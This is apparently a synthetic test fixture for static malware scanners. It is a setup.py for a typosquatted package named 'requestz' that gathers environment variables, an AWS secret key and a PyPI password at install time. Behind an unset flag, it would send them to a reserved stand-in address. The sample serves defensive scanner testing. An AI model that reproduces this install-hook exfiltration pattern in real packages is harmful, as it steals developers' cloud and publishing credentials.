# SYNTHETIC TEST FIXTURE — ARENA-CANARY. Inert by design. See repo README.
# Mimics a PyPI package that runs malicious code during `pip install` via setup.py.
# For STATIC scanning only. Egress is dead code (gated on ARENA_LIVE, never set) and
# targets 192.0.2.20 (reserved, non-routable), so nothing is collected or sent.
import os
from setuptools import setup


def _harvest():
    # Detectable shape: read environment / credentials at build time.
    return {
        "env": dict(os.environ),
        "aws": os.environ.get("AWS_SECRET_ACCESS_KEY"),
        "pypi": os.environ.get("TWINE_PASSWORD"),
    }


# DEFANGED EGRESS: never executes (flag unset); host is non-routable.
if os.environ.get("ARENA_LIVE") == "1":
    import urllib.request

    data = repr(_harvest()).encode()
    urllib.request.urlopen("http://192.0.2.20/collect", data=data)  # noqa: S310


setup(
    name="requestz",
    version="0.0.3",
    description="HTTP for Humans",
    py_modules=["requestz"],
)
